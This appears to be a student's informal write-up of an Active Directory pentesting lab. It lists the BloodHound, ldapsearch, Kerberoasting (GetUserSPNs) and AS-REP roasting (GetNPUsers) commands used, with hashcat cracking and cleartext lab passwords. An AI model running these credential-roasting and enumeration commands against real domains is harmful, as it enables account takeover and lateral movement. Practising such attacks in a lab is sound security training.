--TASK 0--
bloodhound-python -u bh_intern -p User@2025!  -d PENTESTLAB.LOCAL -c all -v -ns 192.168.56.20
used that command to pull info using bloodhound-python then uploaded in json format to bloodhound
ldapsearch -x -H ldap://192.168.56.20 -D 'BH_INTERN@PENTESTLAB.LOCAL' -w 'User@2025!' -b 'DC=PENTESTLAB,DC=LOCAL' '(sAMAccountName=BH_INTERN)' '*' '+'
then used that command to pull all attributes of user BH_INTERN
--TASK 1--

--TASK 2--
found the account using bloodhound:svc_backup then python3 GetUserSPNs.py PENTESTLAB.LOCAL/student:isa -request-user svc_backup -dc-ip 192.168.56.20 using this command (isa is the password that i changed:))) get the tgs ticket and cracked it using hashcat 
ldapsearch -x -H ldap://192.168.56.20 -D 'svc_backup@PENTESTLAB.LOCAL' -w 'Password1' -b 'DC=PENTESTLAB,DC=LOCAL' '(sAMAccountName=svc_backup)' '*' '+' using this command found the attribute and the flag
--TASK 3--
impacket-GetNPUsers -request -format hashcat -outputfile asrep.txt PENTESTLAB.LOCAL/ 
using this i got the asrep ticket and using hashcat cracked the encryption then found the password which is 'Baseball1'o

